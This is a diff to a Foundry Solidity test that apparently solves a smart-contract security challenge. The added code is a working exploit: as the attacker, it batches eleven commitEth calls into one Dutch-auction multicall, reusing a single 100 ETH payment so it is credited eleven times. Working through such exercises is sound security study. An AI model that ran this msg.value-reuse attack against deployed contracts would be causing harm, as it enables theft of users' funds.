@@ -65,6 +65,22 @@ contract Testing is Test {
         vm.startPrank(attacker,attacker);
 
         // implement solution here
+        //_addCommitment(address _addr, uint256 _commitment)
+        /*
+        bytes[] memory _data = new bytes[](1);
+        _data[0] = abi.encodeWithSignature(
+        "_addCommitment(address,uint256)",
+        address(msg.sender),uint256(900e18));
+        dutchAuction.multicall(_data);*/
+
+        bytes memory call = abi.encodeWithSignature("commitEth(address)",attacker);
+        bytes[] memory _data = new bytes[](11);
+
+        for (uint i; i<11; i++) {
+            _data[i] = call;
+        }
+
+        dutchAuction.multicall{value:100e18}(_data);
 
         vm.stopPrank();
         validation();
@@ -80,3 +96,4 @@ contract Testing is Test {
     }
 
 }
+
